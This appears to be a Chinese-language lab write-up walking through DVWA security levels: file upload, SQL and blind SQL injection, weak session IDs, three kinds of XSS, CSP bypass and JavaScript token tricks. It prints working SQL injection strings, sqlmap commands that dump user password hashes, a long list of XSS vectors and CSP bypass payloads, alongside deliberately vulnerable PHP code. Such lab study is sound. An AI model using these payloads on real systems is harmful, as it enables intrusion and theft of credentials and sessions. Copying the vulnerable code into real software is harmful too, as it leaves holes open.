+注意需要从浏览器f12 copy一个页面菜单cookie值到蚁剑中
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/b76d3e96bbf1546169dabe7ab2db9ae2.gif)
+测试连接成功
+> 这里我用postman或者hackbar之类的请求都无法正确请求，不知道蚁剑是怎么处理的
+
+#### impossible
+代码
+
+做了以下处理，基本无法解析木马了
+- checkToken()						判断token是否正确
+- md5( uniqid() . $uploaded_name )	对上传的文件进行重命名
+- strtolower( $uploaded_ext )			判断后缀名
+- $uploaded_type 						判断文件mimetype
+- getimagesize()						判断文件起始字符是否符合
+- imagecreatefromjpeg()				图片二次渲染（可以绕过）
+- rename()							判断文件是否能移动到web目录下
+
+### Insecure CAPTCHA （不安全的验证码）
+#### Low
+#### Medium
+#### Hign
+#### impossible
+### SQL Injection（SQL注入）
+SQL Injection（SQL注入）,是指攻击者通过注入恶意的SQL命令,破坏SQL查询语句的结构,从而达到执行恶意SQL语句的目的。
+
+#### Low
+查看代码，直接拼接sql
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/bb81c0cd19375cbca5b2707958426478.png)
+id中填入：-1' union select user(),database() '
+比如查看操作系统版本数据目录：-1' union select @@version_compile_os,database() '
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/005fd0ccccb4ffae18c2a298dbd2e281.png)
+##### jsql injection
+jSQL Injection是一个轻量级的应用程序，用于从远程服务器查找数据库信息。jSQL是免费的，开源的和可多平台使用的（Windows，Linux，Mac OS X，Solaris）。
+
+jSQL injection是一款由JAVA开法的SQL自动化注入工具，它提供了数据库查询、后台爆破、文件读取、Web shell、SQL Shell、文件上传、暴力枚举、编码、批量注入测试等强大的功能，是一款非常不错的工具，也是渗透测试人员的强大助手。它支持GET\POST注入，同时也可以进行HTTP头注入（这个需要用户自动构建）。与sqlmap相比，其拥有图形化的界面和完整的中文支持。
+安装包：https://github.com/ron190/jsql-injection/releases/
+最新版本要jdk17才能运行。
+
+访问DVWA，通过f12获取到接口的访问路径
+http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit
+注意他的cookie，在其他地方访问要带上cookie
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/377326159a5ad470cf3965dd1d06b334.png)
+
+>注意把id参数放后面，如果放前面发现会失败。
+
+##### sqlmap
+SQLMap是一款开源渗透测试工具，可用于自动检测和利用SQL注入漏洞，并接管数据库服务器。Sqlmap 是一个基于命令行的半自动化SQL注入攻击工具。在我们使用扫描器或者是手工发现了一个SQL注入点后，通常需要验证注入点是否是一个可以利用的点，这个时候就可以利用sqlmap来完成。
+SQLMap官网下载：http://sqlmap.org/#download
+github源码下载：https://github.com/sqlmapproject/sqlmap
+注意sqlmap注意代码需要python3.8以上版本，使用Anaconda Navigator创建一个3.8.0环境激活
+
+```
+D:\green\sql\sqlmapproject-sqlmap-33a6547>conda env list
+# conda environments:
+#
+base                  *  C:\Users\liaomin\anaconda3
+env380                   C:\Users\liaomin\anaconda3\envs\env380
+gpm                      C:\Users\liaomin\anaconda3\envs\gpm
+mathlearn                C:\Users\liaomin\anaconda3\envs\mathlearn
+papi-generator-server     C:\Users\liaomin\anaconda3\envs\papi-generator-server
+py27                     C:\Users\liaomin\anaconda3\envs\py27
+superset                 C:\Users\liaomin\anaconda3\envs\superset
+superset1                C:\Users\liaomin\anaconda3\envs\superset1
+superset2                C:\Users\liaomin\anaconda3\envs\superset2
+
+D:\green\sql\sqlmapproject-sqlmap-33a6547>activate env380
+D:\green\sql\sqlmapproject-sqlmap-33a6547>conda.bat activate env380
+(env380) D:\green\sql\sqlmapproject-sqlmap-33a6547>
+```
+在env380执行sqlmap扫描（注意添加cookie头，f12去浏览器拿最新的）
+**检查注入点：**
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low"
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0e7024c4d57bde94c82abf678dbd8561.png)
+>检查第一次较慢，完成后在执行其他爆破，都会很快。
+
+爆所有数据库信息（--dbs）：
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low" --dbs
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/3d12a0c8addaa4228a00348ab392bb60.png)
+
+**爆当前数据库信息（ --current-db）：**
+
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low" --current-db
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/6838082138fe94d9ba3824a09a955bbf.png)
+
+
+**指定库名列出所有表（-D 数据库名 --tables）**
+
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low" -D dvwa --tables
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/648c29b8886549867217c9a131ebbcad.png)
+
+
+**指定库名表名列出所有字段（-D 数据库名 -T 表名 --columns）**
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low" -D dvwa -T users --columns
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ef137fb87e10a12f35ed9f58ddd80965.png)
+
+**指定库名表名字段dump出指定字段(-D 数据库名 -T 表名 -C 字段，隔开 --dmp)**
+```
+python sqlmap.py -u "http://192.168.20.48/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --headers="Cookie: PHPSESSID=k3e212a0a0p2mj5kut2gmjdfo2; XDEBUG_SESSION=15794; ts_uid=8970165994; ad_play_index=25; security=low" -D dvwa -T users -C user,password --dump
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/745a0063ce6c640bfbbc5ea6c2cc8ec0.png)
+##### burpsuite co2
+可以使用burpsuite的co2插件结合sqlmap，可以直接抓包后发送自动生成sqlmap脚本，相对于手工来说更方便简洁。
+Extender-》Bappstore安装CO2插件
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/5cda1653df2c1e41767ce6daf3f47017.png)
+抓包action发送到co2
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/903efe92f7ee9a8c5a9a3045897850d1.png)
+第一次进入需要设置下sqlmap的执行脚本的位置，已经python的位置
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/7b92d7bc6c26c4059144373d21800479.png)
+配置好后Run按钮就可以执行了，可以根据需要组合条件
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/3edeb44e3f79caf3852d5e14812e3f6d.png)
+指定数据库名和表名 dump
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ad8a74810199a14711e8e444b2179482.png)
+比如其中一个gordonb的密码：e99a18c428cb38d5f260853678922e03 
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/10fdad795ebca995e26eb7b79df120a6.png)
+#### Medium
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e088ee59985a59fed0e6c724e8dba55f.png)
+虽然对id进行参数化转义，但是id又没有了'' 变成了数字，数字变成了下拉框，变得更简单了吧
+抓包直接注入就可以了
+注入值：-1 union select user(),database() 
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/f688c702d08a1a2f5dc094fda7a68ce8.png)
+#### Hign
+看代码是弹出个框输入id后存入session，刷新打开页面取sessiond的id查询，在弹框里输入就可以注入
+注入值：-1' union select @@version_compile_os,database() '![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/3aa0174d06ea816a21fc3f9385418e77.png)
+工具扫描就比较麻烦了，只能手工或者自己写程序。
+
+#### impossible
+id判断是int类型，prepare处理参数，直接摆烂
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e0d4b72f23adfc930ae3a39222fae13c.png)
+
+### SQL Injection（Blind）（SQL盲注）
+盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注
+
+这里功能难度和sql注入是一模一样的，区别在于这个页面上不再显示信息，而是一个bool值
+#### Low
+输入存在的用户id：1时出现：User ID exists in the database.
+输入不存在的用户id：-1时出现：User ID is MISSING from the database.
+此时可以反向通过注入判断某些东西是不是存在
+比如传入-1 肯定是id不存在的，但是如果我union一个select语句，只要是正确的必然变成用户id存在
+比如判断操作系统是不是win
+注入参数：-1' union select 1,1 from dual where instr(@@version_compile_os,'Win')>0 and ''='
+此时的页面的结果是User ID exists in the database.，说明就是window系统
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/c0b3883e269488c2720f2b5d1672af68.png)
+sqlmap是支持盲注的，利用burpsuite和co2，启动sqlmap扫描。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/81cde083da351dc8ebe6480e1b8318c1.png)
+
+#### Medium
+同sql注入 代码
+#### Hign
+同sql注入 代码
+#### impossible
+同sql注入 代码
+### Weak Session IDs （弱会话ID）
+当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携带对应的cookie去访问。
+
+sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限，无需录直接进入特定用户认证界面，进而进行其他操作。
+
+之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionID一旦在生命周期内被窃取，就等同于账户失窃（也就是熟悉的越权）。
+
+常用的会话方式：
+1. session在服务器存储，本地通过cookie带sessionid的方式。
+2. 登录后生成token，token中保持加密的用户信息，通过请求头传递，服务器解密。
+
+#### Low
+看代码
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/5075d28bfb3f68be34e7c71ade0667ee.png)
+添加额外代码用于看效果演示越权low.php
+```
+if ($_COOKIE['dvwaSession'] == "1"){
+	$html= '<pre>welcome admin</pre>';
+}
+```
+多点击几次生成的dvwaSession会不断增加
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/00a18365f98bf8690fa804e307b4cb39.png)
+此时用postman修改dvwa去访问，伪造dvwaSession=1,就可以越权访问了
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/75283e68c6cd89eacd6c36904de6d391.png)
+
+#### Medium
+看代码
+
+```
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+	$cookie_value = time();
+	setcookie("dvwaSession", $cookie_value);
+}
+
+
+?>
+```
+可以看到sessionid使用了时间戳，越权的话，还是从现在往前爆破就行。
+#### Hign
+看代码
+
+```
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+	if (!isset ($_SESSION['last_session_id_high'])) {
+		$_SESSION['last_session_id_high'] = 0;
+	}
+	$_SESSION['last_session_id_high']++;
+	$cookie_value = md5($_SESSION['last_session_id_high']);
+	setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], false, false);
+}
+
+?>
+
+```
+
+#### impossible
+```
+<?php
+
+$html = "";
+
+if ($_SERVER['REQUEST_METHOD'] == "POST") {
+	$cookie_value = sha1(mt_rand() . time() . "Impossible");
+	setcookie("dvwaSession", $cookie_value, time()+3600, "/vulnerabilities/weak_id/", $_SERVER['HTTP_HOST'], true, true);
+}
+?>
+
+```
+数字递增，然后用md5，产生个1数字的md5作为dvwasession爆破即可。
+随机数，时间戳，Impossible，再sha1，基本无解
+### XSS (DOM) （DOM型跨站脚本）
+DOM型XSS漏洞通常出现在以下情况: JavaScript从攻击者可控的源(如URL)获取数据，并将其传递给支持动态代码执行的接收器（如eval()或innerHTML）。这使得攻击者能够执行恶意的JavaScript，这通常允许他们劫持其他用户的帐户。
+要实现基于dom的XSS攻击，需要将数据放置到源中，以便将其传播到接收器并导致执行任意JavaScript。
+
+**DOM型，反射型和存储型的区别**
+
+1、反射型（临时，非持久型）
+发出请求时，XSS代码出现在url中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以叫反射型XSS。
+客户端提交，服务器解析后响应，到客户端再执行
+
+2、存储型（持久型）
+存储型XSS和反射型XSS的差别在于，提交的代码会存储在服务器端（数据库、内存、文件系统等）。
+比如先通过对一个攻击url进行编码(来绕过xss filter)，然后提交该web server(存储在web server中), 然后用户在浏览页面时，如果点击该url，就会触发一个XSS攻击。当然用户点击该url时，也可能会触发一个CSRF(Cross site request forgery)攻击。
+
+3、DOM型
+DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。
+#### Low
+选择English后，自动选择了
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/12d2330131f7d7a95f9c00bf9486852d.png)
+参数中带上script脚本
+直接打印session信息：
+```
+http://192.168.20.48/DVWA/vulnerabilities/xss_d/?default=<script>console.log(document.cookie)</script>
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/d079ffbfef211e21f6be608510c41cf8.png)
+代码直接拼接字符串未做任何处理
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0053afa9a0aa6c30ac80eedf7f7f62c0.png)
+low.php空白
+
+#### Medium
+查看代码medium.php
+```
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+	$default = $_GET['default'];
+	
+	# Do not allow script tags
+	if (stripos ($default, "<script") !== false) {
+		header ("location: ?default=English");
+		exit;
+	}
+}
+
+?>
+
+```
+
+```
+判断如果有<script 直接跳转到English，可以通过使用非<script>标签注入 比如
+<img src='x' onerror='alert(1)'/>
+但是如果直接放进去就当做了option的值，可以先做一个闭合option结束select
+比如之前是<option value=""></option>
+注入
+变成了（不用管注入后字符的成功还是失败）：
+<option value=""</option></select><img src='x' onerror='alert(1)'/>"></option>
+http://192.168.20.48/DVWA/vulnerabilities/xss_d/?default="></option></select><img src='x' onerror='alert(1)'/>
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9fcd024b036a52e2d7655b49fc78c846.png)
+可以注入的标签有很多，如下：
+
+```
+<script>alert('xss')</script>
+<script>alert(/xss/)</script>
+<script>alert(123)</script>
+<a href="javascript:alert(1)">test</a>
+<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
+<a href="x" onclick=eval("alert('xss');")>xss</a>
+<a href="x" onmouseover="alert('xss');">xss</a>
+<a href="x" onmouseout="alert('xss');">xss</a>
+<img src=x onerror="alert(1)">
+<img src=x onerror=eval("alert(1)")>
+<img src=1 onmouseover="alert('xss');">
+<img src=1 onmouseout="alert('xss');">
+<img src=1 onclick="alert('xss');">
+<iframe src="javascript:alert(1)">test</iframe>
+<iframe onload="alert(document.cookie)"></iframe>
+<iframe onload="alert('xss');"></iframe>
+<iframe onload="base64,YWxlcnQoJ3hzcycpOw=="></iframe>
+<iframe onmouseover="alert('xss');"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
+<audio src=1 onerror=alert(1)>
+<audio><source src="x" onerror="alert('xss');"></audio>
+<audio controls onfocus=eval("alert('xss');") autofocus=""></audio>
+<audio controls onmouseover="alert('xss');"><source src="x"></audio>
+<video src=x onerror=alert(1)>
+<video><source onerror="alert('xss');"></video>
+<video controls onmouseover="alert('xss');"></video>
+<video controls onfocus="alert('xss');" autofocus=""></video>
+<video controls onclick="alert('xss');"></video>
+```
+#### Hign
+看代码：
+```
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+
+	# White list the allowable languages
+	switch ($_GET['default']) {
+		case "French":
+		case "English":
+		case "German":
+		case "Spanish":
+			# ok
+			break;
+		default:
+			header ("location: ?default=English");
+			exit;
+	}
+}
+
+```
+直接请求参数限制死了只能是这几种语言，通过锚点来越过
+```
+http://192.168.20.48/DVWA/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
+```
+#### impossible
+查看index.php代码
+```
+# For the impossible level, don't decode the querystring
+$decodeURI = "decodeURI";
+if ($vulnerabilityFile == 'impossible.php') {
+	$decodeURI = "";
+}
+
+```
+不转码html，直接就没辙了
+
+### XSS（Reflected）（反射型跨站脚本）
+反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。
+
+#### Low
+文本框输入：
+```
+<script>alert('xss')</script>
+```
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/e5a5de0d428404f1f1fc7e0b15ca26fa.png)
+
+```
+或者参数上：http://192.168.20.48/DVWA/vulnerabilities/xss_r/?name=<script>alert('xss')</script>
+```
+
+#### Medium
+同xssdom，也是过滤掉了script标签
+```
+或者参数上：http://192.168.20.48/DVWA/vulnerabilities/xss_r/?name=<img src="a" onerror="alert(1)"></img>
+```
+
+#### Hign
+同xssdom,也是未判断锚点
+
+```
+http://192.168.20.48/DVWA/vulnerabilities/xss_r/?name=hello#<img src=x onerror="alert(1)">
+```
+
+#### impossible
+```
+$name = htmlspecialchars( $_GET[ 'name' ] );
+```
+同xssdom，去除了所有的html标签，无解
+### XSS（Stored）（存储型跨站脚本）
+攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码,比如某些新增表单里，某些字段可以写入xss标签。
+#### Low
+查看代码获取名字和message字段插入了guestbook 表，页面显示这个表的所有数据
+```
+$message = trim( $_POST[ 'mtxMessage' ] );
+	$name    = trim( $_POST[ 'txtName' ] );
+
+	// Sanitize message input
+	$message = stripslashes( $message );
+	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+	// Sanitize name input
+	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+	// Update database
+	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+```
+
+
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/0c2a341af76477b2718fc97564c30f11.png)
+点击Sign Guestbook,插入成功后页面每次访问都会执行xss脚本
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/f83729294181613efc5b32ec064406c1.png)
+
+#### Medium
+查看代码
+```
+$message = strip_tags( addslashes( $message ) );
+	$message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+	$message = htmlspecialchars( $message );
+
+	// Sanitize name input
+	$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+	$name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+	// Update database
+	$query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+```
+$message字段有去掉标签，但是$name字段只是过滤了script，发现前端txtName有maxLength=10的限制，修改dom元素的maxLength足够大，写入xss脚本到txtName字段为非script注入标签。
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ba1136c43467affb7f333b9706b739fa.png)
+#### Hign
+同xss dom txtName上去掉maxlength限制内容加上
+```
+text#<img src=x onerror="alert(1)">
+```
+
+#### impossible
+txtName和mtxMessage都已经做了html字符处理，无解。
+### CSP Bypass （CSP绕过）
+CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。
+两种启用 CSP的方法
+#### Low
+查看代码
+
+```
+<?php
+
+$headerCSP = "Content-Security-Policy: script-src 'self' http://pp.com https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
+
+header($headerCSP);
+
+# These might work if you can't create your own for some reason
+# https://pastebin.com/raw/R570EE00
+# https://www.toptal.com/developers/hastebin/raw/cezaruzeka
+
+?>
+<?php
+if (isset ($_POST['include'])) {
+$page[ 'body' ] .= "
+	<script src='" . $_POST['include'] . "'></script>
+";
+}
+$page[ 'body' ] .= '
+<form name="csp" method="POST">
+	<p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
+	<input size="50" type="text" name="include" value="" id="include" />
+	<input type="submit" value="Include" />
+</form>
+';
+
+```
+发现设置了一个响应头，允许script包含的js的域名：
+$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"; 
+
+https://pastebin.com给了一个演示例子
+```
+https://pastebin.com/raw/R570EE00
+```
+虽然直接访问有结果，但是包含进来响应确是空，应该是cors同源问题，我们自己定义一个hosts
+```
+127.0.0.1 pp.com
+```
+修改low.php,新增一个域名
+```
+$headerCSP = "Content-Security-Policy: script-src 'self' http://pp.com https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;";
+```
+在DVWA项目根目录下新增一个test.js,写入以下代码
+
+```
+alert("xxx");
+```
+确保:http://pp.com/DVWA/test.js能访问
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/9ae32cec78e74933803cdb7706da39d1.gif)
+#### Medium
+查看代码
+```
+$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+
+header($headerCSP);
+
+// Disable XSS protections so that inline alert boxes will work
+header ("X-XSS-Protection: 0");
+```
+响应头中添加了只允许javascript中有内连元素nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="才允许执行，
+这里值是固定的，一般用法是每次访问产生一个随机值。
+
+include输入：
+```
+<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
+```
+即可破解。
+
+#### Hign
+明显点击计算后，调用jsonp传入一个回调，我们可以抓包修改这个回调
+查看medium.php，只允许当前域名引用的js。
+```
+$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
+
+```
+查看jsonp.php
+
+```
+<?php
+header("Content-Type: application/json; charset=UTF-8");
+
+if (array_key_exists ("callback", $_GET)) {
+	$callback = $_GET['callback'];
+} else {
+	return "";
+}
+
+$outp = array ("answer" => "15");
+
+echo $callback . "(".json_encode($outp).")";
+?>
+```
+
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/26855c435f5ce58e1a800137ea13d508.gif)
+#### impossible
+查看jsonp_impossible.php
+```
+<?php
+header("Content-Type: application/json; charset=UTF-8");
+
+$outp = array ("answer" => "15");
+
+echo "solveSum (".json_encode($outp).")";
+?>
+写死了回调函数，无解了
+```
+
+### JavaScript
+JavaScript是一种基于对象和事件驱动的、并具有安全性能的脚本语言。是一种解释型语言（代码不需要进行预编译）。通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的。
+
+若是涉及到Cookie、Session等记录用户信息的脚本，应该通过外部引入方式，并且不能暴露文件路径，控制好文件访问权限，若被攻击者获取到重要脚本代码，则能伪造其他合法用户进行伪造。
+
+#### Low
+提交ChangeMe发现正常 输入success提示不合法的token，分析源代码可知道phrase的默认值是
+ChangeMe,通过下面的generate_token可知道取文本框的值通过调用md5(rot13(phrase))获取
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/18a2e495533546825c42e2ca4bd30621.png)
+我们f12打开开发中工具发现，token文本域的值确实是算出来的
+```
+md5(rot13("ChangeMe"))
+'8b479aefbd90795395b3e7089ae0dc09'
+```
+接下来我们在文本框输入success，在浏览器f12 console面板输入generate_token函数后点击submit即可成功![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/7160f6904bd7c5d887975e43a63504bd.gif)
+#### Medium
+通过查看源代码发现引用了一个
+```
+<script src="../../vulnerabilities/javascript/source/medium.js"></script>
+代码：
+function do_something(e) {
+    for (var t = "", n = e.length - 1; n >= 0; n--)
+        t += e[n];
+    return t
+}
+setTimeout(function() {
+    do_elsesomething("XX")
+}, 300);
+function do_elsesomething(e) {
+    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
+}
+
+```
+其实就是token换了一个XX+文本框值+XX的倒置，换汤不换药
+输入success执行：do_elsesomething("XX"),提交即可。
+#### Hign
+查看源代码发现引入了混淆
+```
+<script src="../../vulnerabilities/javascript/source/high.js"></script>
+```
+在token文本框添加一个属性修改事件
+![在这里插入图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/ea98f2fb15a6366ca532d9935c74d7fb.png)
+刷新页面发现键入了jsvm的页面,逻辑是没有混淆的，格式化后分析执行最后三行即可
+
+![请添加图片描述](/docs/images/content/security/burp_suite/action_01_web.md.images/2930cecd837fb8860e4270e5da64a798.gif)
+#### impossible
+你永远不能信任来自用户的任何东西，也不能阻止他们去干扰它，所以没有不可能的水平。
+也就是尽量不要在js端生成任何重要的数据，只能在后端生成
+
+
